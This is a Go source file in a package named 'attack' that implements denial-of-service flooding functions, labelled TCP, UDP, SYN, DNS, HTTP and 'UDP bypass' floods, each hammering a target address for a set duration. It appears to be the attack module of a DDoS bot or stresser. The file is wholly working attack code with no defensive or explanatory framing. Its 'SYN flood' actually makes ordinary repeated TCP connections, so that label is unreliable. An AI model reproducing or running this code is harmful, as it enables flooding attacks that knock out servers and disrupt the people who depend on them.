package attack

import (
	"fmt"
	"math/rand"
	"net"
	myhttp "net/http"
	"strconv"
	"time"
)

// random packets
func generate_random_string(length int) string {
	characters := "0123456789abcdefghijklmnopqrstuvwxyz"
	random_string := ""
	for i := 0; i < length; i++ {
		random_string += fmt.Sprintf("%c", characters[rand.Intn(len(characters))])
	}
	return random_string
}

// tcp flood
func TCP(ip string, port int, dur int) {
	tcp_socket, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return
	}
	end := time.Now().Add(time.Duration(dur) * time.Second)
	for time.Now().Before(end) {
		_, err := tcp_socket.Write([]byte(generate_random_string(1000)))
		if err != nil {
			break
		}
	}
	tcp_socket.Close()
}

// udp flood
func UDP(ip string, port int, dur int) {
	udp_socket, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return
	}

	end := time.Now().Add(time.Duration(dur) * time.Second)
	for time.Now().Before(end) {
		_, err := udp_socket.Write([]byte(generate_random_string(1000)))
		if err != nil {
			break
		}
	}
	udp_socket.Close()
}

// syn flood
func SYN(ip string, port int, dur int) {
	start_time := time.Now()
	timeout := start_time.Add(time.Duration(dur) * time.Second)
	for time.Now().Before(timeout) {
		conn, err := net.Dial("tcp", ip+":"+strconv.Itoa(port))
		if err == nil {
			conn.Close()
		}
	}
}

// dns flood
func DNS(target string, dur int) {
	start_time := time.Now()
	timeout := start_time.Add(time.Duration(dur) * time.Second)
	for time.Now().Before(timeout) {
		_, _ = net.LookupIP(target)
	}
}

// http flood
func HTTP(target string, dur int) {
	start_time := time.Now()
	timeout := start_time.Add(time.Duration(dur) * time.Second)
	for time.Now().Before(timeout) {
		_, _ = myhttp.Get(target)
	}
}

// UDP bypass
func UDP_VIP(target string, port int, dur int) {
	data := []byte{0x13, 0x37, 0xca, 0xfe, 0x01, 0x00, 0x00, 0x00}
	end_time := time.Now().Add(time.Duration(dur) * time.Second)
	for time.Now().Before(end_time) {
		conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
		if err != nil {
			break
		}
		conn.Write(data)
	}
}
